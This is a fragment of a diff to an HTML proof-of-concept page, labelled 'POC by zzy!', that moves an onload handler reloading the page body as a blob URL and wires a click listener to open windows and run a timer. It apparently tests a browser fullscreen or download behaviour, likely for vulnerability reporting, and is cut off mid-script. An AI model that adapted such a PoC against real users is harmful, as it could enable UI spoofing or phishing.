@@ -4,17 +4,19 @@
 <head>
   <meta charset="UTF-8">
   <title>Download & Fullscreen on Keypress</title>
+  <script>
+     window.onload=function(){
+      blob = new Blob([document.body.innerHTML], {type: 'text/html'});
+    url = URL.createObjectURL(blob); 
+     window.open(url,"_self");
+   
+    }</script>
 </head>
 <body>
   <center><h2>POC by zzy!</h2></center>
   <input type="text" id="triggerInput">
   <script>
-    window.onload=function(){
-      blob = new Blob([document.body.innerHTML], {type: 'text/html'});
-    url = URL.createObjectURL(blob); 
-     window.open(url,"_self");
-   
-    }
+  
     document.getElementById('triggerInput').addEventListener('click', function() {
       openWin();
  setTimeout(function() {
